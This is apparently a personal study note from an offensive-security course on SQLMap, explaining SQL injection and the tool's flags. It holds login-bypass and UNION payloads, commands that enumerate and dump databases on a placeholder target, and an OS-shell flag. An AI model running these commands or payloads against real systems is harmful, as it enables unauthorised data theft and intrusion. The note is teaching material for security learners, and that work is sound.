# SQLMap: The Basics
**Path:** CyberSec_101 - Offensive Security Tooling
**Date:** 2026-03-18
**Difficulty:** Easy

---

## What is SQLMap

- Automated SQL injection detection and exploitation tool
- Pre-installed on Kali Linux
- Automates the entire SQLi attack chain
- Supports MySQL, PostgreSQL, Oracle, MSSQL and more

---

## SQL Injection Vulnerability

- Occurs when user input is inserted directly into SQL query
- Attacker injects malicious SQL to manipulate the query
- Common injection points: URL parameters, login forms, search fields
```sql
-- Normal query
SELECT * FROM users WHERE email='test@test.com'

-- Injected query (bypass login)
SELECT * FROM users WHERE email='' OR 1=1--'

-- UNION injection (extract data)
SELECT * FROM users WHERE email='' UNION SELECT username,password FROM users--
```

---

## Core SQLMap Commands
```bash
# Basic scan
sqlmap -u 'http://target.com/page?id=1' --batch

# Find all databases
sqlmap -u 'http://target.com/page?id=1' --dbs --batch

# Find tables in specific database
sqlmap -u 'http://target.com/page?id=1' -D dbname --tables --batch

# Find columns in specific table
sqlmap -u 'http://target.com/page?id=1' -D dbname -T tablename --columns --batch

# Dump all data from table
sqlmap -u 'http://target.com/page?id=1' -D dbname -T tablename --dump --batch

# Using saved Burp request file
sqlmap -r request.txt --batch --dbs
```

---

## Important Flags

- `-u` → target URL in single quotes always
- `-D` → specify database name
- `-T` → specify table name
- `--dbs` → enumerate all databases
- `--tables` → enumerate tables
- `--columns` → enumerate columns
- `--dump` → extract all data from table
- `--batch` → auto answer all prompts with default
- `--level=5` → increase scan depth (use when basic scan fails)
- `--risk=3` → increase risk level of payloads
- `-r` → use saved request file from Burp
- `--os-shell` → attempt to get OS shell

---

## Why Single Quotes Around URL
```bash
# Wrong - & breaks the URL in terminal
sqlmap -u http://target.com/page?email=test&password=test

# Correct - single quotes protect special characters
sqlmap -u 'http://target.com/page?email=test&password=test'
```
The `&` symbol means "run in background" in terminal.
Without quotes the URL gets split into two commands.

---

## What --batch Does

- Auto answers all SQLMap prompts using default values
- `[Y/n]` → automatically answers Y
- `[y/N]` → automatically answers N
- Without --batch → scan stops and waits at every prompt
- Always use --batch for uninterrupted scans

---

## The Full Attack Flow
```
1. Find injectable parameter in URL or form
2. sqlmap -u 'URL' --dbs --batch --level=5
   → find all databases
3. sqlmap -u 'URL' -D dbname --tables --batch
   → find all tables
4. sqlmap -u 'URL' -D dbname -T users --columns --batch
   → find all columns
5. sqlmap -u 'URL' -D dbname -T users --dump --batch
   → extract all data including passwords
```

---

## Using SQLMap With Burp Suite

Best workflow for POST requests and authenticated pages:
```
1. Intercept request in Burp
2. Right click → Save item → save as request.txt
3. sqlmap -r request.txt --batch --dbs --level=5
```
More reliable than manually constructing URLs.

---

## Gotchas / Surprises

- Always wrap URL in single quotes or & breaks the command
- Add --level=5 if basic scan finds nothing
- Parameter values don't matter → email=test is same as email=abc
  SQLMap only cares about parameter names not values
- --batch uses default answers → safe for most scans
- SQLMap saves results in /root/.sqlmap/output/ automatically
- Use -r with Burp saved requests for POST/authenticated pages

---

## My Understanding in Plain English

SQLMap automates what would take hours manually.
You give it a URL with parameters and it tries
hundreds of injection payloads automatically.
Once it finds a vulnerability it can dump the
entire database in minutes. Always use single
quotes around URLs and --batch for clean scans.

---

## Related Notes

- [[SQL Fundamentals]]
- [[Web Application Basics]]
- [[Burp Suite Basics]]
- [[SQLi]]
